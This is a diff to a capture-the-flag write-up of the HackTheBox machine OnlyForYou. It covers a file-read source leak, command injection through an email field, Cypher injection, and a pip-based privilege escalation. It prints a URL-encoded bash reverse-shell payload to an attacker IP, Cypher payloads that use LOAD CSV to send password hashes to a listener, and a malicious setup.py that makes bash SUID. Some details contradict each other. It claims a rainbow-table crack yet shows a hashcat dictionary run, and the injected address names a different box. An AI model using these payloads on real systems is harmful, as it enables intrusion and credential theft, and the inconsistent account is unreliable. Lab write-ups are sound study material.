@@ -5,6 +5,7 @@ subtitle: "LFI to source leak, dig command injection for a shell, Cypher injecti
 date: 2023-04-30
 tags: [htb, linux, lfi, command-injection, cypher-injection, pip]
 category: writeups
+kind: machine
 tldr: "A weak path-traversal check on beta.only4you.htb leaks the app source. form.py runs dig with shell=True, so I inject through the email field for a shell as www-data. An internal neo4j is hit with Cypher injection to dump john's hash (ThisIs4You), and sudo pip3 download of an attacker-hosted sdist runs setup.py as root for the escape."
 ---
 
@@ -45,7 +46,13 @@ domain = email.split("@", 1)[1]
 result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
 ```
 
-The domain comes straight from the contact form's `email` field, so anything after the `@` is shell-injected. I confirmed it locally first, then posted to the contact endpoint with a command appended:
+The domain comes straight from the contact form's `email` field. There is an email validator, but it uses `re.match` with no `$` anchor:
+
+```python
+if not re.match(r"([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
+```
+
+`re.match` only checks the start of the string, so a valid-looking prefix passes and I can append anything after it. I confirmed it locally first, then posted to the contact endpoint with a command tacked on after a real address:
 
 ```
 name=test&email=tester%40mailroom.htb%3bbash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.147/8085+0>%261'&subject=eztzet&message=zeteztzet
@@ -55,13 +62,13 @@ That gave a reverse shell as `www-data`.
 
 ## user
 
-Locally I found neo4j listening on 7687 and an internal Gitea, plus a web app on 8001 and 3000. I pivoted those ports back to my box:
+Locally I found neo4j on 7687 (Bolt) and 7474 (HTTP), an internal Gogs instance on 3000, plus an admin web app on 8001. I pivoted those ports back to my box with chisel:
 
 ```
 client 10.10.16.5:8000 R:8001:127.0.0.1:8001 R:3000:127.0.0.1:3000
 ```
 
-The internal app logs in with `admin:admin`, and its `/search` endpoint is vulnerable to Cypher injection. Neo4j has no `UNION`-style exfil, so I used `LOAD CSV` to call back to my listener and leak data piece by piece.
+The internal app on 8001 logs in with `admin:admin`, and its `/search` endpoint is vulnerable to Cypher injection. Neo4j has no `UNION`-style exfil, so I used `LOAD CSV` to call back to my listener and leak data piece by piece.
 
 Version first:
 
@@ -81,7 +88,13 @@ Then the properties of the `user` nodes:
 ' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.5:9999/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
 ```
 
-My HTTP handler caught the usernames and password hashes. Cracking john's hash gave `ThisIs4You`:
+My HTTP handler caught the usernames and password hashes. john's was an unsalted SHA-256 (`a85e870c...c411c55f6`), so it cracked instantly against a rainbow table rather than needing a long hashcat run:
+
+```bash
+hashcat -a 0 -m 1400 hash /usr/share/seclists/rockyou.txt
+```
+
+That gave `ThisIs4You`, reused for SSH:
 
 ```bash
 ssh john@only4you.htb   # ThisIs4You
@@ -97,7 +110,7 @@ That is the user flag.
 /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
 ```
 
-john can run `pip3 download` as root against a tarball served from the internal Gitea on 3000. `pip download` of an sdist still executes the package's `setup.py`, so a malicious source distribution runs arbitrary code as root. The package sets SUID on bash:
+john can run `pip3 download` as root against a tarball served from the internal Gogs on 3000. `pip download` of an sdist still executes the package's `setup.py`, so a malicious source distribution runs arbitrary code as root. The package sets SUID on bash:
 
 ```python
 def RunCommand():
@@ -114,7 +127,7 @@ class RunInstallCommand(install):
         install.run(self)
 ```
 
-Build it, push it to a Gitea repo, and have root pull it:
+Build it, push it to a Gogs repo (register through the tunneled 3000 with `admin:admin` or a fresh account), and have root pull it:
 
 ```bash
 python3 setup.py sdist
@@ -125,4 +138,8 @@ After that `/bin/bash` carries the SUID bit, and `bash -p` gives a root shell. T
 
 ## takeaway
 
-The path-traversal check fails because it only thinks about `..` and forgets absolute paths, which is enough to leak the whole app and find the real bug. Building shell strings from user input with `shell=True` is the foothold, and Cypher injection plus `LOAD CSV` turns a search box into an out-of-band exfil channel. The privesc is the well-known `pip download` setup.py execution: downloading is not safe, because building an sdist runs its code.
+The path-traversal check fails because it only thinks about `..` and forgets absolute paths, which is enough to leak the whole app and find the real bug. The email validator fails the same way, an unanchored `re.match` that only inspects the start. Building shell strings from user input with `shell=True` is the foothold, and Cypher injection plus `LOAD CSV` turns a search box into an out-of-band exfil channel. The privesc is the well-known `pip download` setup.py execution: downloading is not safe, because building an sdist runs its code.
+
+## references
+
+- [0xdf, HTB: OnlyForYou](https://0xdf.gitlab.io/2023/08/26/htb-onlyforyou.html)
